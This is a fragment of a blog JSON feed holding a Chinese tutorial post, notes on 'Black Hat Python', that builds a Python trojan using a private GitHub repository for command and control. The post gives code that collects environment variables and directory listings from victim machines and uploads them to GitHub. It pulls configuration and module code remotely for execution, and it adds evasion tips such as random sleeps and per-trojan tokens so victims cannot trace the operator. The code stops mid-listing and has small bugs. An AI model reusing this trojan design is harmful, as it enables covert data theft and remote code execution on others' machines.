/></p>\n<h1 id=\"reference\"><a class=\"anchor\" href=\"#reference\">#</a> Reference</h1>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2RheXVoYWl0YW5nMS9hcnRpY2xlL2RldGFpbHMvMTEyMjIxMzU0\">https://blog.csdn.net/dayuhaitang1/article/details/112221354</span></p>\n",
            "tags": [
                "MFC运行时类型识别",
                "关键字static",
                "关键字const"
            ]
        },
        {
            "id": "https://or0kit.github.io/Programming/Python/%E5%9F%BA%E4%BA%8EGithub%E6%9C%8D%E5%8A%A1%E7%9A%84C&C%E9%80%9A%E4%BF%A1/",
            "url": "https://or0kit.github.io/Programming/Python/%E5%9F%BA%E4%BA%8EGithub%E6%9C%8D%E5%8A%A1%E7%9A%84C&C%E9%80%9A%E4%BF%A1/",
            "title": "基于Github服务的C&C通信",
            "date_published": "2022-05-04T06:11:30.000Z",
            "content_html": "<h1 id=\"楔子\"><a class=\"anchor\" href=\"#楔子\">#</a> 楔子</h1>\n<p>看了 Python 黑帽子一书，记一下笔记。</p>\n<h1 id=\"正文\"><a class=\"anchor\" href=\"#正文\">#</a> 正文</h1>\n<p>想要开发一套实用的木马框架，最大的挑战之一是设计合理的控制、更新和传输数据的方案。</p>\n<h2 id=\"基于github服务的cc通信\"><a class=\"anchor\" href=\"#基于github服务的cc通信\">#</a> 基于 Github 服务的 C&amp;C 通信</h2>\n<p>本章利用 Github 作为存放木马配置、窃取受害者系统数据的通道，并且将木马执行任务所需的所有模块都托管在 Github 上。</p>\n<p>“魔改” Python 原生的导入机制，这样创建新的木马模块后，木马就能自动从仓库里直接拉取这些模块以及任何需要依赖的第三方库</p>\n<p>好处：</p>\n<ol>\n<li>和 Github 之间的通信流量都是经过 SSL 加密的。</li>\n<li>公司内网一般不会禁用 Github。</li>\n</ol>\n<p>使用私有仓库，以防有人窥探我们的行动。</p>\n<h3 id=\"第一步\"><a class=\"anchor\" href=\"#第一步\">#</a> 第一步</h3>\n<details class=\"info\"><summary>创建Github仓库</summary><div>\n<p>注册 Github 账号就不说了，创建一个名字叫  <code>bhptrojan</code>  的新仓库。</p>\n<p><img data-src=\"image001.png\" alt=\"\" /></p>\n<p>安装 python 版本的 Github API 库：  <code>pip3 install github3.py</code></p>\n<p><img data-src=\"image002.png\" alt=\"\" /></p>\n<p>在本地创建这个仓库的基本结构。在命令行中输入以下内容：</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">mkdir</span> bhptrojan</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token builtin class-name\">cd</span> bhptrojan</pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token function\">git</span> init</pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token function\">mkdir</span> modules</pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token function\">mkdir</span> config</pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token function\">mkdir</span> data</pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token function\">touch</span> .gitignore</pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token function\">git</span> <span class=\"token function\">add</span> <span class=\"token builtin class-name\">.</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token function\">git</span> commit -m <span class=\"token string\">\"Adds repo structure for trojan.\"</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token function\">git</span> remote <span class=\"token function\">add</span> origin https://github.com/<span class=\"token operator\">&lt;</span>YourUserName<span class=\"token operator\">></span>/bhptrojan.git</pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token function\">git</span> push origin master</pre></td></tr></table></figure><p><img data-src=\"image003.png\" alt=\"\" /></p>\n<p>可能需要科学上网！</p>\n<p>这样就创建了仓库的初始结构。<br />\n其中  <code>config</code>  目录存放这每种木马独有的配置文件。这样部署木马时，你会希望每种木马执行不同的任务，所以每种木马应该检查各自的配置文件。<br />\n <code>modules</code>  目录存放这各种模块可供木马选用。我们会修改 Python 的导入机制，让木马能够从 GitHUb 仓库里直接导入这些模块。<br />\n有了这种远程导入能力，你就能通过 GitHub 下发各种第三方库，避免每次添加新功能或依赖时都重新编译打包可执行木马文件。<br />\n最后  <code>data</code>  目录则是木马用来上交它们收集到的数据的地方。</p>\n<p>也可以创建一个 GitHub 个人访问令牌，当通过 HTTPS 与 GItHub API 交互时，可以用令牌代替你的密码。<br />\n这个书中让参考：<span class=\"exturl\" data-url=\"aHR0cHM6Ly9kb2NzLmdpdGh1Yi5jb20vZW4vYXV0aGVudGljYXRpb24=\">https://docs.github.com/en/authentication</span></p>\n<p>创建完令牌后保存在 mytoken.txt 中。记得添加到  <code>.gitignore</code>  中，这样就不会把身份凭证推送到仓库里了。</p>\n</div></details>\n<h3 id=\"第二步\"><a class=\"anchor\" href=\"#第二步\">#</a> 第二步</h3>\n<details class=\"info\"><summary>编写一些简单的模块</summary><div>\n<p>在  <code>module</code>  文件夹下创建两个模块一个为  <code>dirlister.py</code> ，另一个为  <code>environment.py</code></p>\n<p><span class=\"exturl\" data-url=\"aHR0cDovL2Rpcmxpc3Rlci5weQ==\">dirlister.py</span>:</p>\n<figure class=\"highlight py\"><figcaption data-lang=\"Python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">import</span> os</pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">run</span><span class=\"token punctuation\">(</span><span class=\"token operator\">**</span>args<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token triple-quoted-string string\">\"\"\"</pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    会把当前目录下所有文件列出来，并将一个结果拼成一个字符串返回。</pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    \"\"\"</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"[*] In dirlister module.\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    files <span class=\"token operator\">=</span> os<span class=\"token punctuation\">.</span>listdir<span class=\"token punctuation\">(</span><span class=\"token string\">\".\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    <span class=\"token keyword\">return</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>files<span class=\"token punctuation\">)</span></pre></td></tr></table></figure><figure class=\"highlight py\"><figcaption data-lang=\"Python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">import</span> os</pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">run</span><span class=\"token punctuation\">(</span><span class=\"token operator\">**</span>args<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token triple-quoted-string string\">\"\"\"</pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    这个模块仅仅收集远程设备上所设定的所有环境变量</pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    \"\"\"</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"[*] In environment module.\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    <span class=\"token keyword\">return</span> os<span class=\"token punctuation\">.</span>environ</pre></td></tr></table></figure><p>开发的每个模块都应该提供一个接受若干个参数的 run 函数，这样技能以一个相对统一的形式来加载每个模块，又能通过定制配置文件给每个模块传递不同的参数。</p>\n<p>接下了将这些代码推到 GitHub 仓库上，以便木马使用。</p>\n<p>执行一下命令：</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">git</span> <span class=\"token function\">add</span> <span class=\"token builtin class-name\">.</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token function\">git</span> commit -m <span class=\"token string\">\"Add new modules.\"</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token function\">git</span> push origin master</pre></td></tr></table></figure><p>可以看到代码被推到 GitHub 仓库里了。</p>\n<p>这就是开发木马的工作流程，可以添加一些更复杂的木马模块，巩固所学。</p>\n</div></details>\n<h3 id=\"第三步\"><a class=\"anchor\" href=\"#第三步\">#</a> 第三步</h3>\n<details class=\"info\"><summary>编写木马配置文件</summary><div>\n<p>我们会设定让每个木马去检查  <code>config</code>  目录中的  <code>TROJANID.json</code>  文件，它是一个简单的 JSON 文档，可以解析它、把它转换成 Python 字典，然后根据里面的信息操控木马的行为。</p>\n<p>在 <code>config</code>  目录下创建一个 <code>abc.json</code> , 并输入以下内容:</p>\n<figure class=\"highlight json\"><figcaption data-lang=\"JSON\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token punctuation\">[</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>  <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token property\">\"module\"</span> <span class=\"token operator\">:</span> <span class=\"token string\">\"dirlister\"</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>  <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>  <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    <span class=\"token property\">\"module\"</span> <span class=\"token operator\">:</span> <span class=\"token string\">\"environment\"</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>  <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token punctuation\">]</span></pre></td></tr></table></figure><p>这里只是简单列出了木马应该运行那些模块。</p>\n<p>当然这里也可以添加一些额外的使用选项，比如模块执行的时间、模块的执行次数，或是传递给模块的参数。</p>\n<p>然后在主仓库目录下执行一下命令：</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">git</span> <span class=\"token function\">add</span> <span class=\"token builtin class-name\">.</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token function\">git</span> commit -m <span class=\"token string\">\"Add simple configuration.\"</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token function\">git</span> push origin master</pre></td></tr></table></figure></div></details>\n<h3 id=\"第四步\"><a class=\"anchor\" href=\"#第四步\">#</a> 第四步</h3>\n<details class=\"info\"><summary>构建基于GitHub通信的木马</summary><div>\n<p>木马主体会从 GitHub 获取配置信息和要执行的代码。<br />\n首先我们先编写一批函数用于连接、鉴权以及调用 GitHub API。新建一个文件明明为： <code>git_trojan.py</code></p>\n<p>先包含必要的库：</p>\n<figure class=\"highlight py\"><figcaption data-lang=\"Python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">import</span> base64</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">import</span> github3</pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">import</span> importlib</pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">import</span> json</pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">import</span> random</pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token keyword\">import</span> sys</pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token keyword\">import</span> threading</pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token keyword\">import</span> time</pre></td></tr><tr><td data-num=\"9\"></td><td><pre></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token keyword\">from</span> datetime <span class=\"token keyword\">import</span> datetime</pre></td></tr></table></figure><p>编写与木马相关的 GitHub 代码：</p>\n<figure class=\"highlight py\"><figcaption data-lang=\"Python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">github_connect</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    <span class=\"token keyword\">with</span> <span class=\"token builtin\">open</span><span class=\"token punctuation\">(</span><span class=\"token string\">'mytoken.txt'</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">as</span> f<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>        token <span class=\"token operator\">=</span> f<span class=\"token punctuation\">.</span>read<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    user <span class=\"token operator\">=</span> <span class=\"token string\">'tiarno'</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    sess <span class=\"token operator\">=</span> github3<span class=\"token punctuation\">.</span>login<span class=\"token punctuation\">(</span>token<span class=\"token operator\">=</span>token<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    <span class=\"token keyword\">return</span> sess<span class=\"token punctuation\">.</span>repository<span class=\"token punctuation\">(</span>user<span class=\"token punctuation\">,</span> <span class=\"token string\">'bhptrojan'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">get_file_contents</span><span class=\"token punctuation\">(</span>dirname<span class=\"token punctuation\">,</span>module_name<span class=\"token punctuation\">,</span>repo<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    <span class=\"token keyword\">return</span> repo<span class=\"token punctuation\">.</span>file_contents<span class=\"token punctuation\">(</span><span class=\"token string-interpolation\"><span class=\"token string\">f'</span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>dirname<span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">/</span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>module_name<span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">'</span></span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p>这两个函数会处理和 GitHub 仓库之间的交互。</p>\n<p><code>github_connect</code>  函数会读取在 GitHub 上创建的令牌。<br />\n在创建令牌时，将它保存到了一个名为  <code>mytoken.txt</code>  的文件中。<br />\n现在我们该从改文件中读取令牌，并创建一个  <code>GitHub</code>  仓库连接。<br />\n我们可以给不同的木马创建不同的令牌，这样就能控制每个木马有权访问哪些数据。即使受害者捕获了木马，也无法溯源并删除你的所有数据。</p>\n<p><code>get_file_contents</code>  函数会接受文件名、模块名以及一个 GitHub 连接作为参数，并返回相应模块的内容。<br />\n这个函数负责从远处仓库里抓取文件并读取里面的数据。我们会用它读取配置文件和模块源代码。</p>\n<p>现在我们来编写 Trojan 类，它负责执行基本的木马任务：</p>\n<figure class=\"highlight py\"><figcaption data-lang=\"Python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name\">Trojan</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    <span class=\"token keyword\">def</span> <span class=\"token function\">__init__</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">,</span> <span class=\"token builtin\">id</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>        <span class=\"token triple-quoted-string string\">\"\"\"</pre></td></tr><tr><td data-num=\"4\"></td><td><pre>        初始化木马对象，设定好它的配置文件和数据目录路径（用于上报木马的输出结果），然后连接GitHub仓库。</pre></td></tr><tr><td data-num=\"5\"></td><td><pre>        \"\"\"</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>        self<span class=\"token punctuation\">.</span><span class=\"token builtin\">id</span> <span class=\"token operator\">=</span> <span class=\"token builtin\">id</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>        self<span class=\"token punctuation\">.</span>config_file <span class=\"token operator\">=</span> <span class=\"token string-interpolation\"><span class=\"token string\">f'</span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span><span class=\"token builtin\">id</span><span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">.json'</span></span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>        self<span class=\"token punctuation\">.</span>data_path <span class=\"token operator\">=</span> <span class=\"token string-interpolation\"><span class=\"token string\">f'data/</span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span><span class=\"token builtin\">id</span><span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">/'</span></span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>        self<span class=\"token punctuation\">.</span>repo <span class=\"token operator\">=</span> github_connect<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p>下面编写和 GitHub 仓库通信时所需的函数：</p>\n<figure class=\"highlight py\"><figcaption data-lang=\"Python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">get_config</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    <span class=\"token triple-quoted-string string\">\"\"\"</pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    从仓库中读取远程配置文件，这样木马就知道该运行那些模块，并通过调用exec函数将模块内容引入木马对象。</pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    \"\"\"</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    config_json <span class=\"token operator\">=</span> get_file_contents<span class=\"token punctuation\">(</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>        <span class=\"token string\">'config'</span><span class=\"token punctuation\">,</span> self<span class=\"token punctuation\">.</span>config_file<span class=\"token punctuation\">,</span> self<span class=\"token punctuation\">.</span>repo</pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    config <span class=\"token operator\">=</span> json<span class=\"token punctuation\">.</span>loads<span class=\"token punctuation\">(</span>base64<span class=\"token punctuation\">.</span>b64decode<span class=\"token punctuation\">(</span>config_json<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    <span class=\"token keyword\">for</span> task <span class=\"token keyword\">in</span> config<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>        <span class=\"token keyword\">if</span> task<span class=\"token punctuation\">[</span><span class=\"token string\">'module'</span><span class=\"token punctuation\">]</span> <span class=\"token keyword\">not</span> <span class=\"token keyword\">in</span> sys<span class=\"token punctuation\">.</span>modules<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>            <span class=\"token keyword\">exec</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"import %s\"</span> <span class=\"token operator\">%</span> task<span class=\"token punctuation\">[</span><span class=\"token string\">'module'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    <span class=\"token keyword\">return</span> config</pre></td></tr><tr><td data-num=\"14\"></td><td><pre></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">module_runner</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">,</span> module<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    <span class=\"token triple-quoted-string string\">\"\"\"</pre></td></tr><tr><td data-num=\"17\"></td><td><pre>    函数会调用刚才所引入模块的run函数。</pre></td></tr><tr><td data-num=\"18\"></td><td><pre>    \"\"\"</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>    result <span class=\"token operator\">=</span> sys<span class=\"token punctuation\">.</span>modules<span class=\"token punctuation\">[</span>module<span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>run<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>    self<span class=\"token punctuation\">.</span>store_module_result<span class=\"token punctuation\">(</span>result<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre></pre></td></tr><tr><td data-num=\"22\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">store_module_result</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">,</span> data<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>    <span class=\"token triple-quoted-string string\">\"\"\"</pre></td></tr><tr><td data-num=\"24\"></td><td><pre>    函数会创建一个文件，其文件名包含当前日期和时间，然后将模块的输出结果存在这个文件中。</pre></td></tr><tr><td data-num=\"25\"></td><td><pre>    \"\"\"</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>    message <span class=\"token operator\">=</span> datetime<span class=\"token punctuation\">.</span>now<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>isformat<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>    remote_path <span class=\"token operator\">=</span> <span class=\"token string-interpolation\"><span class=\"token string\">f'data/</span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>self<span class=\"token punctuation\">.</span><span class=\"token builtin\">id</span><span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">/</span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>message<span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">.data'</span></span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>    bindata <span class=\"token operator\">=</span> <span class=\"token builtin\">bytes</span><span class=\"token punctuation\">(</span><span class=\"token string\">'%r'</span> <span class=\"token operator\">%</span> data<span class=\"token punctuation\">,</span> <span class=\"token string\">'utf-8'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>    self<span class=\"token punctuation\">.</span>repo<span class=\"token punctuation\">.</span>create_file<span class=\"token punctuation\">(</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>        remote_path<span class=\"token punctuation\">,</span> message<span class=\"token punctuation\">,</span> base64<span class=\"token punctuation\">.</span>b64encode<span class=\"token punctuation\">(</span>bindata<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>    <span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p>我们的木马会利用这个三个函数，把从目标设备上收集到的数据推送到 GitHub 上。</p>\n<figure class=\"highlight py\"><figcaption data-lang=\"Python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">run</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    <span class=\"token triple-quoted-string string\">\"\"\"</pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    执行任务</pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    \"\"\"</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token keyword\">while</span> <span class=\"token boolean\">True</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>        <span class=\"token comment\"># 从仓库中拉取配置文件</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>        config <span class=\"token operator\">=</span> self<span class=\"token punctuation\">.</span>get_config<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>        <span class=\"token keyword\">for</span> task <span class=\"token keyword\">in</span> config<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>            <span class=\"token comment\"># 把模块交给一个独立的线程去执行。</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>            thread <span class=\"token operator\">=</span> threading<span class=\"token punctuation\">.</span>Thread<span class=\"token punctuation\">(</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>                target<span class=\"token operator\">=</span>self<span class=\"token punctuation\">.</span>module_runner<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>                args<span class=\"token operator\">=</span><span class=\"token punctuation\">(</span>task<span class=\"token punctuation\">[</span><span class=\"token string\">'module'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>            <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>            thread<span class=\"token punctuation\">.</span>start<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>            time<span class=\"token punctuation\">.</span>sleep<span class=\"token punctuation\">(</span>random<span class=\"token punctuation\">.</span>randint<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">10</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>        time<span class=\"token punctuation\">.</span>sleep<span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>random<span class=\"token punctuation\">.</span>randint<span class=\"token punctuation\">(</span><span class=\"token number\">30</span> <span class=\"token operator\">*</span> <span class=\"token number\">60</span><span class=\"token punctuation\">,</span> <span class=\"token number\">3</span> <span class=\"token operator\">*</span> <span class=\"token number\">60</span> <span class=\"token operator\">*</span> <span class=\"token number\">60</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p>在 run 函数中，我们开始执行这些任务。</p>\n<p>进入 module_runner 函数后，我们调用模块的 run 函数执行之中的代码。当它执行结束后，应该会输出一个字符串，我们会把这个字符串推送到 GitHub 上。</p>\n<p>每执行完一个任务，木马安都会随机休眠一段时间，以尝试绕过防守方的流量特征分析。当然也可以创建一堆指向 Google 的流量，回事访问一些正常网站，以此来伪装木马。</p>\n</div></details>\n<h3 id=\"第五步\"><a class=\"anchor\" href=\"#第五步\">#</a> 第五步</h3>\n<details class=\"info\"><summary>深入探索Python的import功能</summary><div>\n<p>在我们操纵的远程设备上难免会用到这个设备上不存在的包，然而远程安装软件包是件很麻烦的事。<br />\n除此之外，我们还希望每次添加一项依赖（比如 scapy）之后，可以确保每个模块都能用上这个依赖。</p>\n<p>Python 允许我们改动导入模块的过程，如果没能在本地找到某个模块，就会调用我们定义的 import 类，这样就能从我们的仓库远程拉取代码。<br />\n我们要把编写的这个类添加到  <code>sys.meta_path</code>  列表中。</p>\n<p>现在构建这个类：</p>\n<figure class=\"highlight py\"><figcaption data-lang=\"Python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name\">GitImporter</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    <span class=\"token keyword\">def</span> <span class=\"token function\">__init__</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>        self<span class=\"token punctuation\">.</span>current_module_code <span class=\"token operator\">=</span> <span class=\"token string\">\"\"</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token keyword\">def</span> <span class=\"token function\">find_module</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">,</span> name<span class=\"token punctuation\">,</span> path<span class=\"token operator\">=</span><span class=\"token boolean\">None</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>        <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"[*] Attempting to retrieve %s\"</span> <span class=\"token operator\">%</span> name<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>        self<span class=\"token punctuation\">.</span>repo <span class=\"token operator\">=</span> github_connect<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>        new_library <span class=\"token operator\">=</span> get_file_contents<span class=\"token punctuation\">(</span><span class=\"token string\">'modules'</span><span class=\"token punctuation\">,</span> <span class=\"token string-interpolation\"><span class=\"token string\">f'</span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>name<span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">.py'</span></span><span class=\"token punctuation\">,</span> self<span class=\"token punctuation\">.</span>repo<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>        <span class=\"token keyword\">if</span> new_library <span class=\"token keyword\">is</span> <span class=\"token 